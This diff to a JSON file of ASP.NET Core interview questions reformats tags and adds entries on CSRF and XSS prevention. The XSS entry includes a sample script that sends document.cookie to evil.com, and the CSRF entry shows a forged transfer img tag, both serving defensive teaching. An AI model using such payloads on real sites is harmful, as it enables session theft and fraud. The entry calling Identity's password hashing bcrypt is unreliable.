@@ -23,7 +23,12 @@
         }
       ],
       "tip": "<strong>JWTs cannot be invalidated server-side</strong> (they're stateless). Keep access token expiry short (15min). Use refresh tokens in DB to support logout/revocation — revoke the refresh token, and the access token expires naturally.",
-      "tags": ["jwt", "auth", "security", "token"],
+      "tags": [
+        "jwt",
+        "auth",
+        "security",
+        "token"
+      ],
       "sortOrder": 1,
       "isActive": true
     },
@@ -45,7 +50,12 @@
         }
       ],
       "tip": "<strong>Read claims in controllers:</strong> <code>User.FindFirstValue(ClaimTypes.NameIdentifier)</code> gets the user ID. <code>User.IsInRole(\"Admin\")</code> checks roles. <code>User.Claims</code> for all claims. The <code>User</code> property is a <code>ClaimsPrincipal</code> populated by the JWT middleware.",
-      "tags": ["jwt", "auth", "aspnetcore", "security"],
+      "tags": [
+        "jwt",
+        "auth",
+        "aspnetcore",
+        "security"
+      ],
       "sortOrder": 2,
       "isActive": true
     },
@@ -67,7 +77,12 @@
         }
       ],
       "tip": "<strong>HTTP 401 vs 403:</strong> Authentication failure → 401 Unauthorized (\"who are you?\"). Authorization failure → 403 Forbidden (\"I know who you are, but you can't do this\"). Using the wrong code leaks information — returning 403 for unauthenticated requests tells attackers the endpoint exists.",
-      "tags": ["auth", "authentication", "authorization", "aspnetcore"],
+      "tags": [
+        "auth",
+        "authentication",
+        "authorization",
+        "aspnetcore"
+      ],
       "sortOrder": 3,
       "isActive": true
     },
@@ -89,7 +104,12 @@
         }
       ],
       "tip": "<strong>Never use the access token to get user identity.</strong> Access tokens are for calling APIs — their content is undefined by OAuth. Use the ID token (OIDC) or a /userinfo endpoint for identity. This is a common OAuth misuse.",
-      "tags": ["oauth", "oidc", "auth", "security"],
+      "tags": [
+        "oauth",
+        "oidc",
+        "auth",
+        "security"
+      ],
       "sortOrder": 4,
       "isActive": true
     },
@@ -111,7 +131,12 @@
         }
       ],
       "tip": "<strong>Identity uses bcrypt for password hashing</strong> (via ASP.NET Core Data Protection). Never store plain passwords or use MD5/SHA1 — Identity's default is already secure. The hash is adaptive (work factor increases over time).",
-      "tags": ["auth", "identity", "aspnetcore", "security"],
+      "tags": [
+        "auth",
+        "identity",
+        "aspnetcore",
+        "security"
+      ],
       "sortOrder": 5,
       "isActive": true
     },
@@ -133,8 +158,61 @@
         }
       ],
       "tip": "<strong>Claims are extensible but keep them small.</strong> Every claim is in every request (in the JWT). Don't put large data in claims — put a user ID and look up details per-request from cache. A JWT with 50 claims is a red flag.",
-      "tags": ["auth", "claims", "authorization", "aspnetcore"],
+      "tags": [
+        "auth",
+        "claims",
+        "authorization",
+        "aspnetcore"
+      ],
       "sortOrder": 6,
+      "isActive": true
+    },
+    {
+      "id": "auth-007",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is CSRF (Cross-Site Request Forgery) and how do you prevent it in ASP.NET Core?",
+      "answer": "<p>CSRF is an attack where a malicious site tricks an authenticated user's browser into making a request to <em>your</em> site without their knowledge. The browser automatically sends cookies — including the session or auth cookie — on every request to your domain. An attacker exploits this.</p><h4>Classic CSRF attack scenario:</h4><ol><li>User logs into your banking app. Their session cookie is stored in the browser.</li><li>User visits a malicious site (in another tab) that contains: <code>&lt;img src=\"https://yourbank.com/transfer?to=attacker&amp;amount=5000\"&gt;</code></li><li>Browser sees the img tag, fires a GET to your bank. Cookie goes along automatically.</li><li>Bank sees a valid authenticated request — money transferred.</li></ol><h4>How ASP.NET Core prevents it — Anti-Forgery Tokens:</h4><p>The server generates a unique token, puts it in a hidden form field AND stores it in a cookie. On POST, both must match. The attacker's site can't read your cookies (same-origin policy), so it can't get the token to include in the forged request.</p><pre><code class=\"language-csharp\">// In Program.cs — anti-forgery is registered automatically with AddControllersWithViews()\nbuilder.Services.AddControllersWithViews();\n\n// In Razor form — @Html.AntiForgeryToken() or asp-antiforgery=\"true\" on form tag\n// Tag helper approach (preferred):\n&lt;form asp-action=\"Transfer\" method=\"post\"&gt;\n    &lt;!-- framework auto-injects hidden __RequestVerificationToken field --&gt;\n    &lt;input name=\"Amount\" /&gt;\n    &lt;button type=\"submit\"&gt;Transfer&lt;/button&gt;\n&lt;/form&gt;\n\n// Controller — validate the token\n[HttpPost]\n[ValidateAntiForgeryToken] // throws 400 if token missing/invalid\npublic IActionResult Transfer(TransferViewModel model) { }\n\n// Global for all POST actions\nbuilder.Services.AddControllersWithViews(options =>\n    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));</code></pre><h4>CSRF with APIs (JWT):</h4><p>If your API uses JWT Bearer tokens (not cookies), CSRF is generally not a concern — browsers don't auto-send Authorization headers. CSRF only applies when auth is cookie-based. For SPAs calling APIs with JWT in headers, you're already safe.</p><p>If you use cookie-based auth with an API, add the <code>SameSite=Strict</code> or <code>SameSite=Lax</code> cookie attribute — modern browsers block cross-site cookies by default.</p>",
+      "followUps": [
+        {
+          "question": "What is the SameSite cookie attribute and how does it help against CSRF?",
+          "answer": "<p><code>SameSite</code> is a cookie attribute that tells browsers when to include the cookie in cross-site requests:</p><ul><li><code>SameSite=Strict</code> — cookie only sent for same-site requests. Visiting yourbank.com from a link on another site won't send the cookie. Most secure but can break legitimate cross-origin flows like OAuth redirects.</li><li><code>SameSite=Lax</code> — cookie sent for same-site requests and top-level navigation GET requests (clicking a link). The default in modern browsers. Blocks cross-site POSTs, which stops most CSRF attacks.</li><li><code>SameSite=None</code> — cookie sent everywhere. Must also set <code>Secure</code>. Use only for legitimate cross-site scenarios like third-party auth.</li></ul><pre><code class=\"language-csharp\">builder.Services.ConfigureApplicationCookie(opts =>\n{\n    opts.Cookie.SameSite = SameSiteMode.Strict;\n    opts.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    opts.Cookie.HttpOnly = true;\n});</code></pre>"
+        }
+      ],
+      "tip": "<strong>CSRF only applies to cookie auth.</strong> If your API uses JWT in Authorization headers, CSRF doesn't apply — attackers can't make browsers send custom headers cross-origin. Focus CSRF protection on MVC apps with cookie-based sessions.",
+      "tags": [
+        "csrf",
+        "security",
+        "antiforgery",
+        "cookies",
+        "auth"
+      ],
+      "sortOrder": 7,
+      "isActive": true
+    },
+    {
+      "id": "auth-008",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is XSS (Cross-Site Scripting) and how do you prevent it in ASP.NET Core?",
+      "answer": "<p>XSS is when an attacker injects malicious JavaScript into your web page, and that script runs in other users' browsers. It's one of the most common web vulnerabilities — OWASP Top 10 every year.</p><h4>How XSS works:</h4><p>Your site displays user-supplied content (a comment, a username, a search query). If you render it as raw HTML without encoding, an attacker can submit: <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. When other users view the page, their browser executes that script. The attacker now has their session cookies.</p><h4>Types of XSS:</h4><ul><li><strong>Stored XSS</strong> — malicious script saved to DB, served to every user who views that content. Most dangerous.</li><li><strong>Reflected XSS</strong> — malicious script in a URL parameter, reflected back in the response. Example: <code>/search?q=&lt;script&gt;...&lt;/script&gt;</code></li><li><strong>DOM-based XSS</strong> — script manipulates the DOM client-side via JavaScript, never touches the server.</li></ul><h4>Prevention in ASP.NET Core:</h4><h5>1. Razor auto-encoding (your first line of defence)</h5><pre><code class=\"language-html\">&lt;!-- Razor encodes by default -- safe --&gt;\n&lt;p&gt;Hello, @Model.UserName&lt;/p&gt;\n&lt;!-- If UserName = \"&lt;script&gt;alert(1)&lt;/script&gt;\"\n     Renders as: Hello, &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; -- harmless text --&gt;\n\n&lt;!-- DANGEROUS -- bypasses encoding, only for trusted HTML --&gt;\n&lt;p&gt;@Html.Raw(Model.HtmlContent)&lt;/p&gt; // only use if content is from a trusted source</code></pre><h5>2. Content Security Policy (CSP) header</h5><pre><code class=\"language-csharp\">// Tells the browser only execute scripts from your own domain\napp.Use(async (context, next) =&gt;\n{\n    context.Response.Headers.Add(\n        \"Content-Security-Policy\",\n        \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'\");\n    await next();\n});</code></pre><h5>3. HtmlEncoder for manual encoding</h5><pre><code class=\"language-csharp\">using System.Text.Encodings.Web;\n\n// In a service/controller where you need to manually encode\nstring safe = HtmlEncoder.Default.Encode(userInput);\n// &lt;script&gt;alert(1)&lt;/script&gt; → &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></pre><h5>4. Input validation + sanitisation for rich text</h5><p>If you allow rich HTML (like a WYSIWYG editor), use a whitelist sanitiser — the <strong>HtmlSanitizer</strong> NuGet package is the standard for this in .NET. Never try to build your own HTML sanitiser with regex.</p><h4>HttpOnly cookies for session protection:</h4><p>Even if XSS happens, <code>HttpOnly</code> cookies can't be read by JavaScript — limiting the damage. Always set cookies as HttpOnly.</p>",
+      "followUps": [
+        {
+          "question": "What is the difference between XSS and SQL injection? Both involve injecting malicious code.",
+          "answer": "<p>Different targets, different vectors, different defences:</p><ul><li><strong>SQL Injection</strong> — malicious input gets executed by the <em>database</em>. Attacker injects SQL syntax into an input field that ends up in a SQL query. Defence: parameterised queries / ORMs (EF Core, Dapper).</li><li><strong>XSS</strong> — malicious input gets executed by the <em>browser</em> as JavaScript. Attacker injects script tags or event handlers into content that gets rendered as HTML. Defence: output encoding (Razor does this by default), CSP headers, input sanitisation for rich text.</li></ul><p>Both exploits work by <strong>trusting user input</strong> and treating data as code. The principle is the same: never trust user input, always encode/parameterise output appropriately for its context.</p>"
+        }
+      ],
+      "tip": "<strong>Razor encodes by default — that's your safety net.</strong> The risk is when you use @Html.Raw(), JavaScript inline rendering, or Angular/React's dangerouslySetInnerHTML. Always be explicit when bypassing encoding — treat it like using 'unsafe' in C#.",
+      "tags": [
+        "xss",
+        "security",
+        "csp",
+        "encoding",
+        "html"
+      ],
+      "sortOrder": 8,
       "isActive": true
     }
   ]
